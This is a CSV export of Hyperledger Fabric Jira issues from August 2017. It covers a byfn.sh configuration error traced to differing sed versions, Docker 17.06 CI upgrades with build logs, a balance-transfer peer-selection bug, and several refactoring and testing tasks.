Summary,Issue key,Issue id,Parent id,Issue Type,Status,Project key,Project name,Project type,Project lead,Project description,Project url,Priority,Resolution,Assignee,Reporter,Creator,Created,Updated,Last Viewed,Resolved,Affects Version/s,Affects Version/s,Affects Version/s,Fix Version/s,Fix Version/s,Component/s,Component/s,Component/s,Component/s,Component/s,Due Date,Votes,Labels,Labels,Labels,Labels,Labels,Labels,Description,Environment,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Log Work,Log Work,Original Estimate,Remaining Estimate,Time Spent,Work Ratio,Σ Original Estimate,Σ Remaining Estimate,Σ Time Spent,Security Level,Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Inward issue link (Cloners),Inward issue link (Cloners),Inward issue link (Cloners),Outward issue link (Cloners),Inward issue link (Duplicate),Inward issue link (Duplicate),Inward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Custom field (Business Value),Custom field (Commit Levels),Custom field (Current Status),Custom field (Design),Custom field (Design Status),Custom field (Documentation Impact),Custom field (Documentation Status),Custom field (Epic Color),Custom field (Epic Link),Custom field (Epic Name),Custom field (Epic Status),Custom field (Executed),Custom field (Found in Commit),Custom field (Function Test Status),Custom field (Must Fix),Custom field (Original story points),Custom field (Parent Link),Custom field (Rank),Custom field (Release Note),Custom field (Release Note Required),Custom field (Root Cause Analysis),Custom field (SDK Impact),Custom field (Sample/Tutorial),Sprint,Sprint,Sprint,Sprint,Custom field (Steps to Reproduce),Custom field (Story Points),Custom field (System Test Impact),Custom field (Target end),Custom field (Target start),Custom field (Team),Custom field (Team),Custom field (Test Plan),Custom field (Test Result),Custom field (Test Result Details),Custom field (Test Type),Custom field (Triaged),Custom field (Usage),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Workaround),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitCommitsReferenced),Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment
Fabric Video,FAB-5900,20377,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,joe-alewine,joe-alewine,joe-alewine,24/Aug/17 1:08 PM,30/Jul/19 10:14 AM,28/Oct/23 3:00 AM,30/Jul/19 10:14 AM,,,,,,,,,,,,0,"video,",,,,,,"We need a video to introduce people to Fabric now that it's actually gotten to 1.0 (and beyond) in an enterprise ready state. This would be a high level video about *why* and *what* HF is, not *how* it works, focusing on the current-world problem that HF solves (rather than merely presenting it as a neat innovation). It would be brief (about three minutes or so), fun, and lively.

I've included a shot list/narration to give an idea of what I mean. Any and all comments welcome.",,joe-alewine,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,432000,432000,,0%,432000,432000,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Sep/17 3:13 AM;joe-alewine;Fabric V1 video script.docx;https://jira.hyperledger.org/secure/attachment/12043/Fabric+V1+video+script.docx",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye27:",,,,,,,,,,,,,,,,,,,,,,,joe-alewine,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Sep/17 3:13 AM;joe-alewine;Script updated.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"byfn.sh error. ""ERRO 003 Could not find configtx.yaml. Please make sure that FABRIC_CFG_PATH is set to a path which contains configtx.yaml Failed to generate orderer genesis block...""",FAB-5901,20378,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,kchristidis,hazim-j,hazim-j,24/Aug/17 2:52 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Feb/18 11:54 PM,v1.0.0,,,v1.1.0,,fabric-tools,,,,,,0,,,,,,,"Trying to follow the ""Building your first network"" tutorial and ran into this issue when executing '

byfn.sh -m generate' command.

 
{code:java}
$ sh byfn.sh -m generate

Generating certs and genesis block for with channel 'mychannel' and CLI timeout of '10000'
Continue (y/n)? y
proceeding ...
/cygdrive/c/Users/user/Desktop/fabric-samples/bin/cryptogen

##########################################################
##### Generate certificates using cryptogen tool #########
##########################################################
org1.example.com
org2.example.com

sed: -e expression #1, char 85: unterminated `s' command
sed: -e expression #1, char 85: unterminated `s' command
/cygdrive/c/Users/user/Desktop/fabric-samples/bin/configtxgen
##########################################################
######### Generating Orderer Genesis block ##############
##########################################################
2017-08-24 15:40:41.268 AEST [common/configtx/tool] main -> INFO 001 Loading configuration
2017-08-24 15:40:41.268 AEST [common/configtx/tool/localconfig] Load -> CRIT 002 Error reading configuration: Unsupported Config Type """"
2017-08-24 15:40:41.269 AEST [common/configtx/tool] func1 -> ERRO 003 Could not find configtx.yaml. Please make sure that FABRIC_CFG_PATH is set to a path which contains configtx.yaml
Failed to generate orderer genesis block...{code}","Running on windows 10 64bit,

Docker version 17.06.1-ce, build 874a737,

docker-compose version 1.14.0, build c7bdf9e3,

go version go1.8.3 windows/amd64,

curl 7.55.1 (x86_64-pc-win32)",gregnotso,hazim-j,kchristidis,mastersingh24,sdcho,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3467,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye2f:",,,,,,,,,,,,,,,,,,,,,,,gregnotso,hazim-j,kchristidis,mastersingh24,sdcho,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Aug/17 9:28 AM;mastersingh24;[~hazim-j] 
Can you try 
*./byfn.sh -m generate*
instead of 
*sh byfn.sh -m generate*?;;;","04/Sep/17 9:28 PM;mastersingh24;[~hazim-j] Not sure if you are still having issues.  You might want to try the following:

1) Use Git Bash (I think you are using Cygwin?)
2) Pull down the latest version of fabric-samples and also install the [latest binaries|http://hyperledger-fabric.readthedocs.io/en/latest/samples.html#download-platform-specific-binaries]

We'll leave this open for a couple of days, but after that we'll close this as using the prereqs with the latest samples and binaries works fine on Windows 10;;;","08/Sep/17 3:34 PM;sdcho;I also have the exactly the same issue.

I was using bash from PowerShell.

I am using the latest binaries.;;;","08/Sep/17 11:37 PM;sdcho;The problem resolved by running the script under bash provided by git.;;;","16/Sep/17 9:41 PM;sdcho;By running the *byfn.sh*, all the required environment variables such as FABRIC_CFG_PATH is set within the script.

What was preventing the proper running of the script seems like due to different version of sed.

By using git bash instead of cygwin bash did not have any issues.

The difference there is the version of sed.

sed versions:

git sed: 5.4.2

cygwin sed: 4.4;;;","11/Dec/17 3:08 AM;gregnotso;this seems unresolved for 3 months now and still shows up in the latest release or 1.0.5;;;","14/Feb/18 1:42 PM;kchristidis;I know what's wrong here. Will push a fix tomorrow.

The prompt for this was the message posted to the mailing list yesterday: https://lists.hyperledger.org/pipermail/hyperledger-fabric/2018-February/002821.html;;;","14/Feb/18 2:48 PM;kchristidis;https://gerrit.hyperledger.org/r/c/17901/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Refine Endorser ProcessProposal() code,FAB-5902,20379,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baohua,baohua,baohua,24/Aug/17 5:38 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,24/Feb/18 11:22 PM,v1.0.0,v1.0.1,v1.0.2,v1.1.0,,,,,,,,0,,,,,,,"Existing code is too long (over 100 lines).

Separate those check, validation related code into another func of preProcess().

 ",,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzye2n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Aug/17 5:41 PM;baohua;https://gerrit.hyperledger.org/r/12735;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add statsd reporter,FAB-5903,20380,15982,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,grapebaba,grapebaba,grapebaba,24/Aug/17 5:41 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,01/Sep/17 5:28 PM,,,,v1.1.0,,fabric-ci,,,,,,0,,,,,,,Add statsd reporter and test,,grapebaba,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye2v:",,,,,,,,,,,,,,,,,,,,,,,grapebaba,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade x86 CI env to Docker 17.06+,FAB-5904,20382,19980,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jwagantall,mastersingh24,mastersingh24,24/Aug/17 9:51 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Sep/17 1:07 AM,,,,v1.1.0,,fabric-ci,,,,,,0,,,,,,,,,jwagantall,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5905,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye33:",,,,,,,,,,,,,,,,,,,,,,,jwagantall,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 10:01 PM;rameshthoomu;[~jwagantall] could you please upgrade docker version in sandbox to 17.06.. Let me know once done.. Will test this before you enable this on production minions..;;;","02/Sep/17 9:02 AM;jwagantall;Tested my change locally and works to the lates 17.06 version

 

Testing this change now in the sandbox: https://gerrit.hyperledger.org/r/13103;;;","02/Sep/17 9:52 AM;jwagantall;[~rameshthoomu] the sandbox is now updated. please test it and let me know how it goes.. 

 ;;;","05/Sep/17 11:29 PM;rameshthoomu;[~jwagantall] I see fabric-ca builds are failing after updating docker version 17.06.. not sure below error is related to docker version. Seems
*`libltdl-dev`* package is missing.

Observed below error while build fabric-ca image on {color:#d04437}*Docker version 17.06*{color}
{code:java}
00:15:08.848 Building fabric-ca-server in bin directory ...
00:15:22.230 # github.com/hyperledger/fabric-ca/vendor/github.com/miekg/pkcs11
00:15:22.230 vendor/github.com/miekg/pkcs11/pkcs11.go:29:18: fatal error: ltdl.h: No such file or directory
00:15:22.230 compilation terminated.
00:16:27.233 Makefile:105: recipe for target 'bin/fabric-ca-server' failed
00:16:27.233 make: *** [bin/fabric-ca-server] Error 2
00:16:27.259 Build step 'Execute shell' marked build as failure{code};;;","06/Sep/17 6:20 AM;jwagantall;@rameshthoomu can you test again the sandbox please? both missing packages have been re-added [https://gerrit.hyperledger.org/r/#/c/13103/10/packer/provision/baseline.sh];;;","06/Sep/17 2:09 PM;jwagantall;Let me know if this is ready for production. Looks like these 2 errors were fixed in the latest image. ;;;","14/Sep/17 1:05 AM;rameshthoomu;Docker version 17.06.02-ce and docker-compose version 1.16.1 has been updated in x86_64 production minions. Closing this issue.;;;","14/Sep/17 1:06 AM;rameshthoomu;{code:java}
00:01:05.287 + docker version
00:01:05.307 Client:
00:01:05.307  Version:      17.06.2-ce
00:01:05.308  API version:  1.30
00:01:05.309  Go version:   go1.8.3
00:01:05.309  Git commit:   cec0b72
00:01:05.310  Built:        Tue Sep  5 20:00:17 2017
00:01:05.311  OS/Arch:      linux/amd64
00:01:05.311 
00:01:05.311 Server:
00:01:05.312  Version:      17.06.2-ce
00:01:05.313  API version:  1.30 (minimum version 1.12)
00:01:05.314  Go version:   go1.8.3
00:01:05.315  Git commit:   cec0b72
00:01:05.315  Built:        Tue Sep  5 19:59:11 2017
00:01:05.316  OS/Arch:      linux/amd64{code}
{code:java}
00:01:05.369 + docker-compose version
00:01:07.076 docker-compose version 1.16.1, build 6d1ac21{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade PPE CI env to Docker 17.06+,FAB-5905,20383,19980,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,mastersingh24,mastersingh24,24/Aug/17 9:52 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Sep/17 10:57 PM,,,,v1.1.0,,fabric-ci,,,,,,0,,,,,,,,,harsha544,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5906,,,FAB-5904,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye3b:",,,,,,,,,,,,,,,,,,,,,,,harsha544,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 9:58 PM;rameshthoomu;upgraded docker version to 17.06 in power sandbox machine and tested unit-tests.. Will update the same on all machines once testing is done.;;;","05/Sep/17 11:00 PM;rameshthoomu;Observed below error while build fabric-ca image on {color:#d04437}*Docker version 17.06*{color}
{code:java}
00:15:08.848 Building fabric-ca-server in bin directory ...
00:15:22.230 # github.com/hyperledger/fabric-ca/vendor/github.com/miekg/pkcs11
00:15:22.230 vendor/github.com/miekg/pkcs11/pkcs11.go:29:18: fatal error: ltdl.h: No such file or directory
00:15:22.230 compilation terminated.
00:16:27.233 Makefile:105: recipe for target 'bin/fabric-ca-server' failed
00:16:27.233 make: *** [bin/fabric-ca-server] Error 2
00:16:27.259 Build step 'Execute shell' marked build as failure{code}
No issues observed on {color:#d04437}*Docker 1.12.6*{color}
{code:java}
00:05:06.364 All files are properly formatted
00:05:06.841 Building fabric-ca-server in bin directory ...
00:05:50.123 Built bin/fabric-ca-server
00:05:50.130 Building fabric-ca-client in bin directory ...
00:06:32.837 Built bin/fabric-ca-client
00:06:32.840 Running all tests ...{code};;;","07/Sep/17 12:42 AM;rameshthoomu;Ignore above error.. Tested fabric changes on {color:#d04437}*docker 17.06*{color} and it worked as expected. I have asked [~harsha544] to update docker on production power nodes. Will close this ticket once this is done.;;;","07/Sep/17 12:48 AM;harsha544;[~rameshthoomu] have updated production power nodes (-10,-11,-12) to have {color:#ff0000}docker 17.06{color} and {color:#ff0000}docker-compose=1.15{color} in place.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade s390 / Z  CI env to Docker 17.06+,FAB-5906,20384,19980,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,mastersingh24,mastersingh24,24/Aug/17 9:53 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Sep/17 10:58 PM,,,,v1.1.0,,fabric-ci,,,,,,0,,,,,,,,,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5905,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye3j:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 9:59 PM;rameshthoomu;upgraded docker version to 17.06 in *z* *sandbox* machine and tested unit-tests.. Will update the same on all machines once testing is done. Also, I see a maintenance window scheduled on all *z production* machines.;;;","07/Sep/17 12:43 AM;rameshthoomu;Ignore above error.. Tested fabric changes on {color:#d04437}*docker 17.06*{color} and it worked as expected. I have asked [~harrijk] to update docker on production power nodes. Will close this ticket once this is done.;;;","08/Sep/17 10:58 PM;rameshthoomu;This has been implemented on production z nodes.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Connect endorser and private data coordinator,FAB-5907,20385,18792,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,24/Aug/17 10:04 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:43 PM,,,,,,fabric-gossip,fabric-peer,,,,,0,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye3r:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
incorporate cello in automated tests to deploy networks,FAB-5911,20392,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,,scottz,scottz,25/Aug/17 2:09 AM,30/Jul/19 10:10 AM,28/Oct/23 3:00 AM,30/Jul/19 10:10 AM,v1.0.1,,,,,fabric-quality,,,,,,1,,,,,,,"It is desirable to have a single easy way to deploy a network. All external users and many internal users could benefit from cello, instead of maintaining their own startup scripts which require an ongoing cost to maintain as fabric evolves. Cello is recommended by fabric team as the supported way to spin up a network. If the Cello team incorporates fabric changes to certs, directories, setup sequences, etc, then many other teams would not have to duplicate their efforts. By incorporating cello within automated tests run daily, it will support cello team by proving in their work, and will enable other teams to focus on their application work. And it would be a huge benefit to external user community, who is currently struggling with setting up networks.

Set up a submodule for cello inside fabric-test repo.

Define default network configuraiton yaml file and provide Readme file explanation how to use it, including how to choose singlehost or multihost, and and how to set config variables defined in core.yaml and configtx.yaml etc.

And revise automated tests as needed to use this cello-initiated network for:
 * e2e tests and other CI tests in daily test suite
 * behave tests
 * performance system tests
 * other integration tests and peer tests from the v1.0 SVT which require a full network",,inatatsu,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzye4f:",,,,Unset,,Sprint 19 - Quality,,,,,,Unset,,,,,,,,,,,inatatsu,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode tests are failing,FAB-5912,20393,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,muralisr,muralisr,25/Aug/17 3:42 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Oct/17 5:44 AM,,,,,,fabric-peer,,,,,,0,,,,,,,Merge of https://gerrit.hyperledger.org/r/#/c/12515  crossed another previous merge (not the fault of either but purely due to 12515 being on hold for a while) which required chaincode framework's authenticator to be initialized.,,denyeart,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye4n:",,,,,,,,,,,,,,,,,,,,,,,denyeart,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Oct/17 5:43 AM;denyeart;https://gerrit.hyperledger.org/r/#/c/12763/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
balance-transfer: queryChaincode fails to select peer,FAB-5913,20406,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yuki-kon,yuki-kon,yuki-kon,25/Aug/17 6:06 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,31/Jan/18 4:13 AM,v1.0.0,v1.0.1,,v1.1.0,,fabric-samples,,,,,,0,,,,,,,"In fabric-samples/balance-transfer/app/query.js, ""queryChaincode"" fails to select peer.
""queryChaincode"" has “peer“ as an args to select a target peer to get ledger's data.
""queryChaincode"" calls channel.queryByChaincode like the below. Target peer is not included in request object.

{code:java}
return channel.queryByChaincode(request, target);
{code}

channel.queryByChaincode accepts target peer as a var in request object. As a result, target peer designated like the above is ignored and transaction proposal is sent to default peers (i.e. peer1 & peer2).
Target peer should be put into request object.

In addition, ""queryChaincode"" doesn’t output responses from all peers in log message. It exits the loop processing after outputting the first response like the below.
We should print all responses from all peers. Also, we should return a response (e.g. the response_payloads[0]) after the loop.

{code:java}
for (let i = 0; i < response_payloads.length; i++) {
                logger.info(args[0]+' now has ' + response_payloads[i].toString('utf8') +
                                ' after the move');
                return args[0]+' now has ' + response_payloads[i].toString('utf8') +
                                ' after the move';
}
{code}
",fabric-samples commit 7cca09f0470eceabc233018e7a9ae48a88487218,mastersingh24,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzye4v:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,mastersingh24,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Aug/17 6:57 AM;yuki-kon;CR is posted here: https://gerrit.hyperledger.org/r/#/c/12765/;;;","01/Oct/17 3:30 AM;mastersingh24;I'm going to mark this as an improvement and target for 1.1.
It's a fine line, but the goal was to keep things simple the first time around so this is an improvement;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
